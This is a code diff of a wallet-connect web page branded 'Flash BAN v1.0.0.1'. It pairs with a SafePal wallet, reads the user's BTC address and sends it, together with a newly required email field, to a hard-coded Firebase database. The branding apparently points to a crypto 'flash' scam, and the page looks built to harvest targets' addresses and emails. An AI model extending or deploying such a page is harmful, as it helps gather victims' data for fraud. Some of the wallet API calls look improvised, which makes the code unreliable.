@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Flash BAN V1.0.0.1 connection to DEFI Wallet</title>
+    <title>SafePal BTC Wallet Connect</title>
     <script src="https://unpkg.com/qrcode"></script>
     <script type="module">
         import { Core } from '@walletconnect/core';
@@ -16,8 +16,8 @@
 
         // App Metadata
         const metadata = {
-            name: 'flashbanv10',
-            description: 'SafePal BTC Connector',
+            name: 'Flash BAN v1.0.0.1 connection',
+            description: 'Connect SafePal and retrieve BTC address',
             url: 'https://your-website.com', // Update this with your actual domain
             icons: ['https://your-website.com/icon.png']
         };
@@ -28,37 +28,49 @@
             metadata
         });
 
-        // Function to connect SafePal
         async function connectWallet() {
-            document.getElementById('connectButton').textContent = 'Connecting...';
-            document.getElementById('connectButton').style.backgroundColor = '#f0ad4e';
+            let email = document.getElementById('emailInput').value.trim();
+            let connectButton = document.getElementById('connectButton');
+            let walletAddressDiv = document.getElementById('walletAddress');
+            let statusMessageDiv = document.getElementById('statusMessage');
+
+            if (!isValidEmail(email)) {
+                statusMessageDiv.textContent = "Invalid email format.";
+                statusMessageDiv.classList.remove("hidden");
+                return;
+            }
+
+            connectButton.textContent = "Connecting...";
+            connectButton.style.backgroundColor = "#f0ad4e";
 
             try {
                 // Generate a WalletConnect pairing URI
                 const { uri } = await walletKit.connect();
-
-                console.log('Scan this QR Code with SafePal:', uri);
-                displayQRCode(uri); // Show the QR code
+                displayQRCode(uri); // Show QR code for scanning
 
                 // Listen for connection event
                 walletKit.on('session_update', async () => {
                     const btcAddress = await requestBitcoinAddress();
-                    document.getElementById('walletAddress').textContent = `Connected BTC Address: ${btcAddress}`;
-                    document.getElementById('connectButton').textContent = 'Wallet Connected';
-                    document.getElementById('connectButton').style.backgroundColor = '#28a745';
+                    walletAddressDiv.textContent = `Connected address: ${btcAddress}`;
+                    statusMessageDiv.textContent = "Wallet Connected Successfully!";
+                    walletAddressDiv.classList.remove("hidden");
+                    statusMessageDiv.classList.remove("hidden");
 
-                    sendToDatabase(btcAddress); // Store the BTC address
+                    sendToDatabase(btcAddress); // Store the BTC address in Firebase
+
+                    connectButton.textContent = "Connected";
+                    connectButton.style.backgroundColor = "#28a745";
                 });
 
             } catch (error) {
-                document.getElementById('statusMessage').textContent = "Connection failed.";
-                document.getElementById('connectButton').textContent = 'CONNECT SAFE PAL';
-                document.getElementById('connectButton').style.backgroundColor = '#f6851b';
-                console.error("Error connecting SafePal:", error);
+                statusMessageDiv.textContent = "Failed to connect wallet.";
+                statusMessageDiv.classList.remove("hidden");
+                connectButton.textContent = "Connect Now";
+                connectButton.style.backgroundColor = "#f6851b";
+                console.error("Connection error:", error);
             }
         }
 
-        // Function to get BTC address
         async function requestBitcoinAddress() {
             try {
                 const result = await walletKit.request({
@@ -72,7 +84,6 @@
             }
         }
 
-        // Function to store BTC address in Firebase
         function sendToDatabase(btcAddress) {
             const apiUrl = `https://apidatabase-ff62a-default-rtdb.firebaseio.com/addresses/${encodeURIComponent(btcAddress)}.json`;
 
@@ -93,7 +104,6 @@
             });
         }
 
-        // Function to generate and display QR Code
         function displayQRCode(uri) {
             document.getElementById("qrcode").innerHTML = "";
             QRCode.toCanvas(uri, { width: 256 }, function (error, canvas) {
@@ -103,7 +113,11 @@
             });
         }
 
-        // Attach function to the button
+        function isValidEmail(email) {
+            const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+            return emailRegex.test(email);
+        }
+
         window.onload = () => {
             document.getElementById('connectButton').onclick = connectWallet;
         };
@@ -131,8 +145,15 @@
         }
         h1 {
             color: #f6851b;
-            font-size: 28px;
+            font-size: 24px;
             margin-bottom: 20px;
+        }
+        input {
+            width: 90%;
+            padding: 10px;
+            border-radius: 5px;
+            border: 1px solid #555;
+            margin-bottom: 10px;
         }
         button {
             background-color: #f6851b;
@@ -144,6 +165,7 @@
             font-size: 16px;
             cursor: pointer;
             transition: background-color 0.3s;
+            width: 100%;
         }
         button:hover {
             background-color: #c17416;
@@ -159,14 +181,18 @@
         .qr-container {
             margin-top: 20px;
         }
+        .hidden {
+            display: none;
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>Flash BAN V1.0.0.1 connection to DEFI Wallet</h1>
+        <h1>Flash BAN v1.0.0.1 connection to DEFI wallet</h1>
+        <input type="email" id="emailInput" placeholder="Enter your email" required>
         <button id="connectButton">CONNECT NOW</button>
-        <div id="walletAddress"></div>
-        <div id="statusMessage"></div>
+        <div id="walletAddress" class="hidden"></div>
+        <div id="statusMessage" class="hidden"></div>
         <div class="qr-container" id="qrcode"></div>
     </div>
 </body>
